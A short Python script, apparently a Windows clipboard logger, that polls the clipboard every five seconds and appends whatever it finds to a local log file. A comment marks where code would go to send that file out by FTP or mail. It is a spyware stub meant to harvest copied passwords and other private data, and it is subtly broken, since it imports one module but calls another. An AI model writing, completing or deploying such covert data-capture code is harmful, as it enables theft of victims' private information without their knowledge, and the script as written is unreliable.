import win32
import time

while True:
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    with open('cliplog.txt', 'a+') as f:
        f.write(data + '\n')
    # * INSERT CODE TO SEND FILE TO FTP OU MAIL
    time.sleep(5)
